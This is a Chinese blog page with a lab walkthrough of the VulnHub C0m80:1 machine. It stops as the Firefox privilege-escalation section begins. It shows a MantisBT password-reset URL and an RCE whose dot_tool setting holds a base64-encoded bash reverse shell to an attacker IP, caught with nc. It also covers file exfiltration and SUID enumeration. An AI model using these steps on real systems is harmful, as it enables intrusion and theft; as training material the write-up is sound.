@@ -1,0 +1,670 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_a0oqhord1y';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  <title>
+    VulnHub C0m80：1 | 雾島风起時
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_a0oqhord1y.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="C0m80: 1项目地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;c0m80&#x2F;C0m80_3mrgnc3_v1.0.ova 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  扫描目录发现有使用 MantisBT 这个系统  任意密码重置MantisBT（CVE-2017-7615）搜索 NDay 发现存在一">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub C0m80：1">
+<meta property="og:url" content="http://example.com/2026/04/04/C0m80%201/index.html">
+<meta property="og:site_name" content="雾島风起時">
+<meta property="og:description" content="C0m80: 1项目地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;c0m80&#x2F;C0m80_3mrgnc3_v1.0.ova 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  扫描目录发现有使用 MantisBT 这个系统  任意密码重置MantisBT（CVE-2017-7615）搜索 NDay 发现存在一">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69cf6aa979bf3b5ce71e1472.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69cf6afd79bf3b5ce71e14c0.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69d0a87175fc555b733651d3.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69d0aba375fc555b73367a1f.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69d0abeb75fc555b73367a53.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69d0ac2d75fc555b73367a7e.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69d0b09375fc555b73367d60.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69d0b80d75fc555b7336c5c6.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69d0b9de75fc555b7336d336.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69d0c71675fc555b73372ccf.png">
+<meta property="article:published_time" content="2026-04-04T08:32:00.000Z">
+<meta property="article:modified_time" content="2026-04-04T08:44:46.167Z">
+<meta property="article:author" content="ALL">
+<meta property="article:tag" content="FireFox（CVE-2012-3993&amp;CVE-2013-1710）">
+<meta property="article:tag" content="NFS 配置不当">
+<meta property="article:tag" content="PuTTY 代替 SSH">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="任意密码重置">
+<meta property="article:tag" content="逆向">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/69cf6aa979bf3b5ce71e1472.png">
+    <link rel="alternate" href="/atom.xml" title="雾島风起時" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/images/banner.webp" alt="VulnHub C0m80：1">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">VulnHub C0m80：1</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#C0m80-1"><span class="toc-number">1.</span> <span class="toc-text">C0m80: 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">任意密码重置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MantisBT%EF%BC%88CVE-2017-7615%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">MantisBT（CVE-2017-7615）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">1.2.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MantisBT%EF%BC%88CVE-2019-15715%EF%BC%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">MantisBT（CVE-2019-15715）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%86%E5%90%91"><span class="toc-number">1.3.</span> <span class="toc-text">逆向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bestFTPserver"><span class="toc-number">1.3.1.</span> <span class="toc-text">bestFTPserver</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FireFox%EF%BC%88CVE-2012-3993-CVE-2013-1710%EF%BC%89"><span class="toc-number">1.4.1.</span> <span class="toc-text">FireFox（CVE-2012-3993&amp;CVE-2013-1710）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NFS-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93"><span class="toc-number">1.4.2.</span> <span class="toc-text">NFS 配置不当</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91"><span class="toc-number">1.5.</span> <span class="toc-text">横向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PuTTY-%E4%BB%A3%E6%9B%BF-SSH"><span class="toc-number">1.5.1.</span> <span class="toc-text">PuTTY 代替 SSH</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ALL" class="lazyload">
+  <div class="sidebar-author-name">ALL</div>
+  <div class="sidebar-description">雾島风起時の日常</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">42</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">83</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/duckpigdog itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1337537884?spm_id_from=333.1007.0.0 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-C0m80 1" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-04-04T08:32:00.000Z" itemprop="datePublished">2026-04-04</time>
+    <time style="display: none;" id="post-update-time">2026-04-04</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="C0m80-1"><a href="#C0m80-1" class="headerlink" title="C0m80: 1"></a>C0m80: 1</h1><p>项目地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/c0m80/C0m80_3mrgnc3_v1.0.ova">https://download.vulnhub.com/c0m80/C0m80_3mrgnc3_v1.0.ova</a></p>
+<p>是一个打包好的镜像文件</p>
+<p><strong>注意：导入 vmx 时一定要选择我已移动，否则没网</strong></p>
+<p>使用 Nmap 扫描出开放服务及操作系统版本</p>
+<p><img src="https://pic1.imgdb.cn/item/69cf6aa979bf3b5ce71e1472.png"></p>
+<p>扫描目录发现有使用 MantisBT 这个系统</p>
+<p><img src="https://pic1.imgdb.cn/item/69cf6afd79bf3b5ce71e14c0.png"></p>
+<h2 id="任意密码重置"><a href="#任意密码重置" class="headerlink" title="任意密码重置"></a>任意密码重置</h2><h3 id="MantisBT（CVE-2017-7615）"><a href="#MantisBT（CVE-2017-7615）" class="headerlink" title="MantisBT（CVE-2017-7615）"></a>MantisBT（CVE-2017-7615）</h3><p>搜索 NDay 发现存在一个任意密码重置漏洞</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.110.142/bugs/verify.php?confirm_hash=&amp;id=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/69d0a87175fc555b733651d3.png"></p>
+<p>重置了 bob  的密码后发现登录不成功</p>
+<p><img src="https://pic1.imgdb.cn/item/69d0aba375fc555b73367a1f.png"></p>
+<p>换一下 <code>id</code> 改成其他用户的试试</p>
+<p><img src="https://pic1.imgdb.cn/item/69d0abeb75fc555b73367a53.png"></p>
+<p>登录成功</p>
+<p><img src="https://pic1.imgdb.cn/item/69d0ac2d75fc555b73367a7e.png"></p>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="MantisBT（CVE-2019-15715）"><a href="#MantisBT（CVE-2019-15715）" class="headerlink" title="MantisBT（CVE-2019-15715）"></a>MantisBT（CVE-2019-15715）</h3><p>登录 MantisBT 后，进入 <code>Manage → Manage Configuration → Configuration Report</code></p>
+<p>设置两个关键选项：</p>
+<ul>
+<li><code>relationship_graph_enable</code> &#x3D; <code>1</code></li>
+<li><code>dot_tool</code> &#x3D; <code>&#39;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMTQvNDQ0NCAwPiYx | base64 -d | /bin/bash;&#39;</code></li>
+</ul>
+<p><img src="https://pic1.imgdb.cn/item/69d0b09375fc555b73367d60.png"></p>
+<p>访问 <code>http://192.168.110.142/bugs/workflow_graph_img.php</code> 触发命令执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ nc -klnvp 4444</span><br><span class="line"></span><br><span class="line">www-data@c0m80~$ <span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line"></span><br><span class="line">www-data@c0m80~$ <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">...</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">...</span><br><span class="line">b0b:x:1000:1001: :/home/b0b:/bin/bash</span><br><span class="line">...</span><br><span class="line">al1ce:x:1001:34::/home/al1ce:/bin/dash</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="bestFTPserver"><a href="#bestFTPserver" class="headerlink" title="bestFTPserver"></a>bestFTPserver</h3><p>我们首先查找 SUID 二进制文件，并检查它们，看看哪些文件异常</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ find / -perm -u=s 2&gt;/dev/null</span><br><span class="line">/bin/makebkp</span><br></pre></td></tr></table></figure>
+
+<p>看看内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ strings /bin/makebkp</span><br><span class="line">setuid</span><br><span class="line">clearenv</span><br><span class="line">system</span><br><span class="line"><span class="built_in">date</span> &gt; /ftpsvr/bkp/ftp104.bkp &amp;&amp; python -c <span class="string">&#x27;print(&quot;-&quot; * 66)&#x27;</span>&gt;&gt; /ftpsvr/bkp/ftp104.bkp &amp;&amp; xxd -E /ftpsvr/bestFTPserver.exe &gt;&gt; /ftpsvr/bkp/ftp104.bkp &amp;&amp; python -c <span class="string">&#x27;print(&quot;-&quot; * 66)&#x27;</span>&gt;&gt; /ftpsvr/bkp/ftp104.bkp &amp;&amp; xxd -E /ftpsvr/bfsvrdll.dll &gt;&gt; /ftpsvr/bkp/ftp104.bkp &amp;&amp; <span class="built_in">chown</span> backup:backup /ftpsvr/bkp/ftp104.bkp</span><br><span class="line">;</span><br><span class="line">makebkp.c</span><br><span class="line">clearenv@@GLIBC_2.0</span><br></pre></td></tr></table></figure>
+
+<p>重点在于</p>
+<p>它会将目录的十六进制转储 <code>bestFTPserver.exe</code> 以及 <code>bfsvrdll.dll</code> 当前时间写入文件 <code>/ftpsvr/bkp/ftp104.bkp</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">date</span> &gt; /ftpsvr/bkp/ftp104.bkp &amp;&amp; </span><br><span class="line">python -c <span class="string">&#x27;print(&quot;-&quot; * 66)&#x27;</span>&gt;&gt; /ftpsvr/bkp/ftp104.bkp &amp;&amp; </span><br><span class="line">xxd -E /ftpsvr/bestFTPserver.exe &gt;&gt; /ftpsvr/bkp/ftp104.bkp &amp;&amp; </span><br><span class="line">python -c <span class="string">&#x27;print(&quot;-&quot; * 66)&#x27;</span>&gt;&gt; /ftpsvr/bkp/ftp104.bkp &amp;&amp; </span><br><span class="line">xxd -E /ftpsvr/bfsvrdll.dll &gt;&gt; /ftpsvr/bkp/ftp104.bkp &amp;&amp; </span><br><span class="line"><span class="built_in">chown</span> backup:backup /ftpsvr/bkp/ftp104.bkp;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以查看文件夹的权限 <code>/ftpsvr/</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> -al /ftpsvr</span><br><span class="line">total 676</span><br><span class="line">drwxr-xr-x  3 b0b  b0b      4096 Sep 23  2017 .</span><br><span class="line">drwxr-xr-x 23 root root    12288 Dec 29 10:12 ..</span><br><span class="line">-rwxr-x---  1 b0b  b0b      3129 Sep 22  2017 BestestSoftware.png</span><br><span class="line">-rwxr-xr-x  1 b0b  b0b    379576 Sep 23  2017 bestFTPserver.exe</span><br><span class="line">-rwxr-xr-x  1 b0b  b0b    278766 Sep 23  2017 bfsvrdll.dll</span><br><span class="line">drwxrwx---  2 root backup   4096 Dec 31 04:37 bkp</span><br><span class="line">-rwxr-xr-x  1 b0b  b0b        89 Sep 23  2017 ftpsvr.sh</span><br></pre></td></tr></table></figure>
+
+<p>我们还知道，在之前收集的信息中，用户 al1ce 是备份组的成员</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">id</span> al1ce</span><br><span class="line">uid=1001(al1ce) gid=34(backup) <span class="built_in">groups</span>=34(backup)</span><br></pre></td></tr></table></figure>
+
+<p>要进入 b0b 的 shell，我们需要另辟蹊径</p>
+<p>还记得这台机器正在<code>nfs</code>运行吗？从我们的机器上，我们可以使用 <code>showmount</code> 该命令查看哪些文件夹可以挂载</p>
+<p>我们使用 <code>-e</code> 标志来显示服务器的导出列表</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ showmount 192.168.110.142 -e</span><br><span class="line">Export list <span class="keyword">for</span> 192.168.110.142:</span><br><span class="line">/ftpsvr/bkp *</span><br></pre></td></tr></table></figure>
+
+<p>该文件夹包含这两个文件的十六进制转储</p>
+<p>在初始 Nmap 扫描中，我们注意到一个非标准端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">20021/tcp open  unknown</span><br></pre></td></tr></table></figure>
+
+<p>通过服务指纹识别（<code>-sV</code>）未能直接识别，但手动连接后返回</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">220 bestFTPserver 1.0.4 ready...</span><br></pre></td></tr></table></figure>
+
+<p>这表明该服务是一个名为 <code>bestFTPserver</code> 的自定义 FTP 服务器，版本 1.0.4与常规 FTP 不同，它的行为异常</p>
+<p>使用常规 <code>ftp</code> 客户端连接，结果：</p>
+<ul>
+<li>允许匿名登录（<code>331 Anonymous login OK, send your e-mail as password</code>），但随后 <code>Login failed.</code></li>
+<li>输入 <code>help</code> 返回大量命令列表（看起来像标准 FTP 命令），但实际执行任何命令（如 <code>ls</code>, <code>system</code>）都返回 <code>502 Unknown ftp command</code></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.110.142 20021</span><br></pre></td></tr></table></figure>
+
+<p>结果发现，<code>b0b</code> 运行 FTP 服务器的正是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ps -aux | grep ftp</span><br><span class="line">b0b       2278  0.0  0.0   5284   288 pts/1    Ss+  03:45   0:00 /bin/bash /ftpsvr/ftpsvr.sh &amp; <span class="built_in">disown</span></span><br><span class="line">b0b       2279  0.0  0.0 1597288  668 pts/1    Sl+  03:45   0:00 /ftpsvr/bestFTPserver.exe</span><br></pre></td></tr></table></figure>
+
+<p>改用 <code>telnet</code> 直接与 TCP 端口交互，可以更灵活地发送原始字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.110.142 20021</span><br></pre></td></tr></table></figure>
+
+<p>输入 <code>system</code> 命令，返回一段有趣的消息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Bob was supposed to <span class="keyword">do</span> this too!</span><br><span class="line">He said there might be a BOUF <span class="keyword">in</span> one of the commands to fix first?</span><br><span class="line">Whatever that is? LOL</span><br><span class="line">He spends too much <span class="keyword">time</span> listening to his old <span class="built_in">cd</span><span class="string">&#x27;s if you ask me!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Alice ;D</span></span><br></pre></td></tr></table></figure>
+
+<p>首先，我们需要获取服务器的源代码。我们可以通过两种方式获取这些文件：</p>
+<ol>
+<li>使用简单的 Python 3 HTTP 服务器将文件发送到我们的机器</li>
+<li>将 <code>/ftpsvr/</code> 文件夹挂载到我们的机器上，提取 hexdumps，然后使用 <code>xxd -r</code> 将其转换回来</li>
+</ol>
+<p>第一个比较简单，所以就用第一个吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@C0m80:/ftpsvr$ python3 -m http.server 8081 &amp;</span><br><span class="line">python3 -m http.server 8081 &amp;</span><br><span class="line">[1] 15369</span><br></pre></td></tr></table></figure>
+
+<p>使用 OllyDBG 逆向发现程序正在将字符串“help”和“HELP”与某些内容进行比较</p>
+<p><img src="https://pic1.imgdb.cn/item/69d0b80d75fc555b7336c5c6.png"></p>
+<p>向下滚动一点，我们看到程序再次将字符串“Send-Report”和“Report-Link”进行比较，我猜这是两个自定义命令</p>
+<p><img src="https://pic1.imgdb.cn/item/69d0b9de75fc555b7336d336.png"></p>
+<p>使用 <code>telnet</code> 再次连接，输入 <code>Send-Report</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt;Send-Report</span><br><span class="line">AWESOME BOB<span class="string">&#x27;S REPORTING FEATURE!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  This tool will auto-send bug report info to my browser BugTracker</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  (INFO)</span></span><br><span class="line"><span class="string">I&#x27;</span>ve not <span class="built_in">set</span> up the MantisBT site fully yet just dump any reports</span><br><span class="line">on github or pastebin &amp; I<span class="string">&#x27;ll view them manually for now.</span></span><br><span class="line"><span class="string">I&#x27;</span>ve added a feature to bestFTPserver <span class="keyword">for</span> this.</span><br><span class="line"></span><br><span class="line">  Regards.</span><br><span class="line">  Bob ;)</span><br><span class="line"></span><br><span class="line">USE CMD: Report-Link</span><br></pre></td></tr></table></figure>
+
+<p>输入 <code>Report-Link</code>，提示 <code>insert link:</code>，输入 <code>http://google.com</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt;Report-Link</span><br><span class="line">insert <span class="built_in">link</span>:http://google.com</span><br><span class="line">BugReport Link Sent to Bob...</span><br></pre></td></tr></table></figure>
+
+<p>实际上，靶机上会启动 Firefox 进程（以用户 <code>b0b</code> 的身份）访问该 URL</p>
+<p>可以通过 <code>ps aux | grep firefox</code> 确认：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b0b      19413  0.9  2.6 1112316 26800 ?       Sl   12:26   0:00 /home/b0b/.wine/drive_c/Program Files/Mozilla Firefox/firefox.exe http://google.com/</span><br></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="FireFox（CVE-2012-3993-CVE-2013-1710）"><a href="#FireFox（CVE-2012-3993-CVE-2013-1710）" class="headerlink" title="FireFox（CVE-2012-3993&amp;CVE-2013-1710）"></a>FireFox（CVE-2012-3993&amp;CVE-2013-1710）</h3><p>在 <code>www-data</code> Shell 中查找 Firefox 安装日志</p>
